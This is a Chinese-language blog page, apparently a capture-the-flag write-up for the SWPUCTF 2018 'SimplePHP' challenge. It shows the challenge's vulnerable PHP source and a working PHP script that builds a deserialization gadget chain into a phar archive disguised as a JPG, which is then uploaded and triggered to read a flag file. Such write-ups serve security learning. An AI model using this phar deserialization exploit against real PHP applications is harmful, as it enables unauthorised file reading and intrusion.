@@ -1,0 +1,264 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[SWPUCTF 2018]SimplePHP | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[SWPUCTF 2018]SimplePHP</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/6
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606215028319.png" alt="image-20240606215028319"></p>
+<p>点击到查看文件，发现有传参！！！</p>
+<p>file？直接file.php</p>
+<p>查看一下</p>
+<p>file.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">include &#x27;function.php&#x27;; </span><br><span class="line">include &#x27;class.php&#x27;; </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); </span><br><span class="line">$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; </span><br><span class="line">if(empty($file)) &#123; </span><br><span class="line">  echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$show = new Show(); </span><br><span class="line">if(file_exists($file)) &#123; </span><br><span class="line">  $show-&gt;source = $file; </span><br><span class="line">  $show-&gt;_show(); </span><br><span class="line">&#125; else if (!empty($file))&#123; </span><br><span class="line">  die(&#x27;file doesn\&#x27;t exists.&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>function.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//show_source(__FILE__); </span><br><span class="line">include &quot;base.php&quot;; </span><br><span class="line">header(&quot;Content-type: text/html;charset=utf-8&quot;); </span><br><span class="line">error_reporting(0); </span><br><span class="line">function upload_file_do() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; </span><br><span class="line">    //mkdir(&quot;upload&quot;,0777); </span><br><span class="line">    if(file_exists(&quot;upload/&quot; . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </span><br><span class="line">    echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">&#125; </span><br><span class="line">function upload_file() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    if(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">function upload_file_check() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); </span><br><span class="line">    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    if(empty($extension)) &#123; </span><br><span class="line">        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        if(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            return true; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>class.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>base.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    session_start(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &lt;/nav&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是激情澎湃的审计时间，笑死</p>
+<p>慢慢看吧</p>
+<p>不难看出是pop链的题</p>
+<p>这道题就是将对象作为字符串进行跳转</p>
+<p>class.php中</p>
+<p>进入__toString函数之后需要str[‘str’]寻找source函数</p>
+<p>如果找不到就可以跳转__get函数</p>
+<p>但是只有Test类才有__get函数，那么就让str[‘str’]返回的对象为Test对象</p>
+<p>多好啊</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后就在Test看看，发现参数</p>
+<p>和get、file_get、file_get_contents</p>
+<p>也就是toString中str触发get函数之后还会接着触发file_get和file_get_contents</p>
+<p>所以，emm</p>
+<p>差不多</p>
+<p>接着就是看看怎么进入toString</p>
+<p>也很简单</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现str，也就是说，这里可以直接通过destruct进入toString，真不错</p>
+<p>所以我们写脚本生成序列化，将文件写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str[&#x27;str&#x27;] = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params[&#x27;source&#x27;] = &#x27;/var/www/html/f1ag.php&#x27;;		// 一定要是绝对路径</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = new Test;</span><br><span class="line">$b = new Show($c);</span><br><span class="line">$a = new C1e4r($b);</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.jpg&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;__HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>真不错</p>
+<p>生成的phar文件就在脚本文件夹内</p>
+<p>改后缀jpg上传</p>
+<p>之后查看upload</p>
+<p>发现文件</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240607203657813.png" alt="image-20240607203657813"></p>
+<p>之后通过phar伪协议查看即可</p>
+<p>拿到flag</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
